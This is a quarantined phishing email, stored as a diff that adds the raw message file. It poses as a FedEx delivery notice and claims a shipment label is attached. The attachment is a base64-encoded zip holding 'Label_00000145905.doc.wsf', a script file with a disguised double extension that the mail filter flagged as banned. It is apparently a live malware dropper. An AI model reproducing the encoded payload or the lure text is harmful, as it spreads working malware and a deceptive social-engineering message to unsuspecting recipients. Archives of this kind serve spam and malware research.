@@ -1,0 +1,142 @@
+Return-Path: <camwebhosting@p3plcpnl0586.prod.phx3.secureserver.net>
+Delivered-To: banned-quarantine
+X-Envelope-To: <contact@jcbl.com>
+X-Envelope-To-Blocked: <contact@jcbl.com>
+X-Quarantine-ID: <aircqdwu5B7Z>
+X-Amavis-Alert: BANNED, message contains .asc,Label_00000145905.doc.wsf
+X-Spam-Flag: NO
+X-Spam-Score: 0
+X-Spam-Level:
+X-Spam-Status: No, score=x tag=x tag2=x kill=x tests=[] autolearn=unavailable
+Received: from mx10.jcbl.com ([127.0.0.1])
+	by localhost (mx9.jcbl.com [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id aircqdwu5B7Z for <contact@jcbl.com>;
+	Sun, 25 Sep 2016 03:12:51 +0530 (IST)
+Received: from p3nlsmtpcp01-03.prod.phx3.secureserver.net (p3nlsmtpcp01-03.prod.phx3.secureserver.net [184.168.200.142])
+	by mx10.jcbl.com (Postfix) with ESMTPS id 735F11042061
+	for <jcbl@jcbl.com>; Sun, 25 Sep 2016 03:12:47 +0530 (IST)
+Received: from p3plcpnl0586.prod.phx3.secureserver.net ([50.62.176.113])
+	by : HOSTING RELAY : with SMTP
+	id nukXbwQeUW58cnukXbb3YO; Sat, 24 Sep 2016 14:44:45 -0700
+Received: from camwebhosting by p3plcpnl0586.prod.phx3.secureserver.net with local (Exim 4.87)
+	(envelope-from <camwebhosting@p3plcpnl0586.prod.phx3.secureserver.net>)
+	id 1bnukW-0002FH-T5
+	for jcbl@jcbl.com; Sat, 24 Sep 2016 14:44:44 -0700
+To: jcbl@jcbl.com
+Subject: Problems with item delivery, n.00000145905
+X-PHP-Script: camhipaasolutions.com/post.php for 187.45.240.50
+Date: Sat, 24 Sep 2016 21:44:44 +0000
+From: "FedEx 2Day" <tom.ward@camhipaasolutions.com>
+Reply-To: "FedEx 2Day" <tom.ward@camhipaasolutions.com>
+Message-ID: <8f69492cd14b56614b4d68ac2d2fbeeb@camhipaasolutions.com>
+X-Priority: 3
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="b1_6c676ec073d65b710c17c3a55598d4a9"
+Content-Transfer-Encoding: 8bit
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - p3plcpnl0586.prod.phx3.secureserver.net
+X-AntiAbuse: Original Domain - jcbl.com
+X-AntiAbuse: Originator/Caller UID/GID - [704155 956] / [47 12]
+X-AntiAbuse: Sender Address Domain - p3plcpnl0586.prod.phx3.secureserver.net
+X-Get-Message-Sender-Via: p3plcpnl0586.prod.phx3.secureserver.net: authenticated_id: camwebhosting/from_h
+X-Authenticated-Sender: p3plcpnl0586.prod.phx3.secureserver.net: tom.ward@camhipaasolutions.com
+X-Source: 
+X-Source-Args: /usr/sbin/proxyexec -q -d -s /var/lib/proxyexec/cagefs.sock/socket /bin/cagefs.server 
+X-Source-Dir: default2014.com:/public_html/camhipaasolutions.com
+X-CMAE-Envelope: MS4wfL8xy1Gp6XiIUOA2zpuZEyK3nTcAlNi1U0TuKkmoJgkVOgj9HuZUeU8AbbvT254s4OeSTWK2B3LZf7iu6E968kDg5ClAcgJx14NZh8s0fyPlKmAc9gGx
+ BOotIGuaAamX9w6f0DwUSZUkiIsXAgHuK4FEYB3tRJ32xbyAbYUDw7VF5YRUC//8MvzAy0dr4BFSCLX8Wra8hB4M/8x+/KcT2UYHgxOKN0ZmyZiC2TV5WKSW
+ COaTU92wr8EegUMKi08mxQ==
+
+--b1_6c676ec073d65b710c17c3a55598d4a9
+Content-Type: text/plain; charset=us-ascii
+
+Dear Customer,
+
+This is to confirm that one or more of your parcels has been shipped.
+Shipment Label is attached to this email.
+
+Sincerely,
+Tom Ward,
+Sr. Station Agent.
+
+
+--b1_6c676ec073d65b710c17c3a55598d4a9
+Content-Type: application/zip; name="Label_00000145905.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Label_00000145905.zip
+
+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
+
+
+--b1_6c676ec073d65b710c17c3a55598d4a9--
+
